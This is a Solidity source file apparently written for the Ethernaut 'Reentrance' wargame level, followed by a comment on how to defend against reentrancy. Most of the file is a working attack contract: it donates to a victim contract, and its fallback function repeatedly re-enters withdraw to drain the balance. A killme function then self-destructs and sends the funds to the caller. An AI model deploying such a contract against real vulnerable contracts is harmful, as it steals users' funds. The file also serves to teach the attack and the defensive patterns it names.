// https://hackernoon.com/hack-solidity-reentrancy-attack

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    Reentrance reentranceContract;

    constructor(address addr) public {
      reentranceContract = Reentrance(addr);
    }

    event Msg(address, uint);

    fallback() external payable {
      uint reentrance_contract_balance = address(reentranceContract).balance;
      emit Msg(address(this), reentrance_contract_balance);
      if (reentrance_contract_balance >= 0.001 ether) {
          emit Msg(address(this), 1);
          reentranceContract.withdraw(0.001 ether);
      }
    }

    function attack() public payable {
      require(msg.value >= 0.001 ether, "need 0.001 ether to attack");
      emit Msg(address(this), 0);
      reentranceContract.donate{value: 0.001 ether}(address(this));
      reentranceContract.withdraw(0.001 ether);
    }

    function killme() external payable {
      address payable addr_to = payable(address(msg.sender));
      selfdestruct(addr_to);
    }

}

/*
  Final note:
  
  In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.

  transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.

  Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

  Re-entrancy is a common attack. You should always be prepared for it!

  

  The DAO Hack
  The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.
 */